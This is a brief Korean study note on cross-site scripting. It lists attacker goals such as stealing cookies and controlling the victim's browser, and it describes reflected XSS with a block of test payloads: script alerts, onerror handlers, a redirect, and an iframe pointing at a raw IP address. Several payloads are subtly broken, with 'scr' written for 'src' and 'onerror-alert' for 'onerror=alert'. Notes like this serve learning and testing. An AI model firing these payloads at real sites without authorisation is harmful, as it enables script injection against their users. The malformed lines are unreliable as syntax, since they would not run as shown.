> Cross Site Scripting 취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적인 HTML 태그나 자바스크립트가 동작하는 공격이다. 악의적인 공격자가 작성한 스크립트 코드가 피해자의 시스템에서 실행되는 것.

**공격 목적**
- 쿠키 훔치기
- 악성 코드 주소로 이동
- 페이지 변조
- 피해 브라우저 제어

- [Common Payloads]()


---

## Reflected XSS

```tag
"><marquee>xss</marquee>
```
![](../Images/Pasted%20image%2020260731102012.png)
-  원리
> 경고 알림창을 띄우면 XSS 취약점 존재한다고 판정
```tag
"><script>alert("xss")</script>
<img src=@ onerror-alert("xss");>
<video scr="1" onerror=document.location="http://naver.com">
<iframe scr="https://121.190.160.232:81"> </iframe>
```

- 웹 서버에서 입력 받은 값을 서버에서 파라미터를 그대로 반환하며 발생
- 검색창 & 모든 파라미터를 대상으로 공격 가능
- 테이블의 구문을 파악 후 취약점 스캔



